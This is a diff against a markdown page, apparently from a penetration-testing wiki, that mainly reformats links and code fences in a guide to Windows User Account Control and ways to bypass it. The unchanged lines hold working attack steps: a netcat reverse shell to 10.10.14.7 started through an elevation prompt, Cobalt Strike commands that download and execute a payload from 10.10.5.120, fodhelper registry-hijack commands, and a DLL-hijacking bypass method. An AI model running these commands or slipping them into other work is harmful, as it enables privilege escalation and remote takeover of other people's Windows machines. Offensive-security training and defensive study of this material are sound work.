@@ -1,9 +1,8 @@
 # UAC - User Account Control
 
-
 ## UAC
 
-[[https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works|User Account Control (UAC)]] is a feature that enables a **consent prompt for elevated activities**. Applications have different `integrity` levels, and a program with a **high level** can perform tasks that **could potentially compromise the system**. When UAC is enabled, applications and tasks always **run under the security context of a non-administrator account** unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run. It is a convenience feature that protects administrators from unintended changes but is not considered a security boundary.
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a **consent prompt for elevated activities**. Applications have different `integrity` levels, and a program with a **high level** can perform tasks that **could potentially compromise the system**. When UAC is enabled, applications and tasks always **run under the security context of a non-administrator account** unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run. It is a convenience feature that protects administrators from unintended changes but is not considered a security boundary.
 
 For more info about integrity levels:
 
@@ -11,20 +10,20 @@ For more info about integrity levels:
 
 When UAC is in place, an administrator user is given 2 tokens: a standard user key, to perform regular actions as regular level, and one with the admin privileges.
 
-This [[https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture. Administrators can use security policies to configure how UAC works specific to their organization at the local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment. The various settings are discussed in detail [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings|page]]. There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:
+This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture. Administrators can use security policies to configure how UAC works specific to their organization at the local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment. The various settings are discussed in detail [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:
 
 | Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
-| [[https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account|User Account Control: Admin Approval Mode for the built-in Administrator account]]                                                     | FilterAdministratorToken    | Disabled                                                     |
-| [[https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop|User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop]] | EnableUIADesktopToggle      | Disabled                                                     |
-| [[https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode|User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode]]                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
-| [[https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users|User Account Control: Behavior of the elevation prompt for standard users]]                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
-| [[https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise|User Account Control: Detect application installations and prompt for elevation]] |
-| [[https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated|User Account Control: Only elevate executables that are signed and validated]]                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
-| [[https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations|User Account Control: Only elevate UIAccess applications that are installed in secure locations]]                       | EnableSecureUIAPaths        | Enabled                                                      |
-| [[https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode|User Account Control: Run all administrators in Admin Approval Mode]]                                                                               | EnableLUA                   | Enabled                                                      |
-| [[https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation|User Account Control: Switch to the secure desktop when prompting for elevation]]                                                       | PromptOnSecureDesktop       | Enabled                                                      |
-| [[https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations|User Account Control: Virtualize file and registry write failures to per-user locations]]                                       | EnableVirtualization        | Enabled                                                      |
+| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
+| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
+| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
+| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
+| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
+| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
+| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
+| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
+| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
+| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |
 
 ### UAC Bypass Theory
 
@@ -50,7 +49,7 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
     EnableLUA    REG_DWORD    0x1
 ```
-```
+
 If it's **`1`** then UAC is **activated**, if its **`0`** or it **doesn't exist**, then UAC is **inactive**.
 
 Then, check **which level** is configured:
@@ -61,7 +60,7 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
     ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 ```
-```
+
 - If **`0`** then, UAC won't prompt (like **disabled**)
 - If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)
 - If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
@@ -90,7 +89,7 @@ You can also check the groups of your user and get the integrity level:
 net user %username%
 whoami /groups | findstr Level
 ```
-```
+
 ## UAC bypass
 
 > [!TIP]
@@ -109,11 +108,11 @@ If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **e
 Start-Process powershell -Verb runAs "calc.exe"
 Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
 ```
-```
+
 #### UAC bypass with token duplication
 
-- [[https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/|https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/]]
-- [[https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html|https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html]]
+- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
+- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
 ### **Very** Basic UAC "bypass" (full file system access)
 
@@ -129,7 +128,7 @@ cd C$
 #Or you could just access it:
 dir \\127.0.0.1\c$\Users\Administrator\Desktop
 ```
-```
+
 ### UAC bypass with cobalt strike
 
 The Cobalt Strike techniques will only work if UAC is not set at it's max security level
@@ -145,16 +144,16 @@ runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-obj
 # Bypass UAC with CMSTPLUA COM interface
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 ```
-```
+
 **Empire** and **Metasploit** also have several modules to **bypass** the **UAC**.
 
 ### KRBUACBypass
 
-Documentation and tool in [[https://github.com/wh0amitz/KRBUACBypass|https://github.com/wh0amitz/KRBUACBypass]]
+Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
 
 ### UAC bypass exploits
 
-[[https://github.com/hfiref0x/UACME|**UACME** ]]which is a **compilation** of several UAC bypass exploits. Note that you will need to **compile UACME using visual studio or msbuild**. The compilation will create several executables (like `Source\Akagi\outout\x64\Debug\Akagi.exe`) , you will need to know **which one you need.**\
+[**UACME** ](https://github.com/hfiref0x/UACME)which is a **compilation** of several UAC bypass exploits. Note that you will need to **compile UACME using visual studio or msbuild**. The compilation will create several executables (like `Source\Akagi\outout\x64\Debug\Akagi.exe`) , you will need to know **which one you need.**\
 You should **be careful** because some bypasses will **prompt some other programs** that will **alert** the **user** that something is happening.
 
 UACME has the **build version from which each technique started working**. You can search for a technique affecting your versions:
@@ -166,8 +165,8 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
-```
-Also, using [[https://en.wikipedia.org/wiki/Windows_10_version_history|this]] page you get the Windows release `1607` from the build versions.
+
+Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.
 
 ### UAC Bypass – fodhelper.exe (Registry hijack)
 
@@ -177,7 +176,7 @@ Registry path queried by fodhelper:
 ```
 HKCU\Software\Classes\ms-settings\Shell\Open\command
 ```
-```
+
 PowerShell steps (set your payload, then trigger):
 ```powershell
 # Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
@@ -197,7 +196,7 @@ Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"
 # 4) (Recommended) Cleanup
 Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
 ```
-```
+
 Notes:
 - Works when the current user is a member of Administrators and UAC level is default/lenient (not Always Notify with extra restrictions).
 - Use the `sysnative` path to start a 64-bit PowerShell from a 32-bit process on 64-bit Windows.
@@ -209,7 +208,7 @@ Notes:
 
 You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:
 
-![[<../../images/image (863).png>|]]
+![[../../images/image (863).png]]
 
 (_explorer.exe_ should works)
 
@@ -217,15 +216,15 @@ You can get using a **meterpreter** session. Migrate to a **process** that has t
 
 If you have access to a **GUI you can just accept the UAC prompt** when you get it, you don't really need a bypass it. So, getting access to a GUI will allow you to bypass the UAC.
 
-Moreover, if you get a GUI session that someone was using (potentially via RDP) there are **some tools that will be running as administrator** from where you could **run** a **cmd** for example **as admin** directly without being prompted again by UAC like [[https://github.com/oski02/UAC-GUI-Bypass-appverif|**https://github.com/oski02/UAC-GUI-Bypass-appverif**]]. This might be a bit more **stealthy**.
+Moreover, if you get a GUI session that someone was using (potentially via RDP) there are **some tools that will be running as administrator** from where you could **run** a **cmd** for example **as admin** directly without being prompted again by UAC like [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). This might be a bit more **stealthy**.
 
 ### Noisy brute-force UAC bypass
 
-If you don't care about being noisy you could always **run something like** [[https://github.com/Chainski/ForceAdmin|**https://github.com/Chainski/ForceAdmin**]] that **ask to elevate permissions until the user does accepts it**.
+If you don't care about being noisy you could always **run something like** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) that **ask to elevate permissions until the user does accepts it**.
 
 ### Your own bypass - Basic UAC bypass methodology
 
-If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [[../windows-local-privilege-escalation/dll-hijacking/index.html|Read this to learn how to find a Dll Hijacking vulnerability]].
+If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).
 
 1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
 2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
@@ -239,10 +238,8 @@ If you take a look to **UACME** you will note that **most UAC bypasses abuse a D
 Consists on watching if an **autoElevated binary** tries to **read** from the **registry** the **name/path** of a **binary** or **command** to be **executed** (this is more interesting if the binary searches this information inside the **HKCU**).
 
 ## References
-- [[https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html|HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps]]
-- [[https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/|LOLBAS: Fodhelper.exe]]
-- [[https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works|Microsoft Docs – How User Account Control works]]
-- [[https://github.com/hfiref0x/UACME|UACME – UAC bypass techniques collection]]
-
-
+- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
+- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
+- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
+- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
 
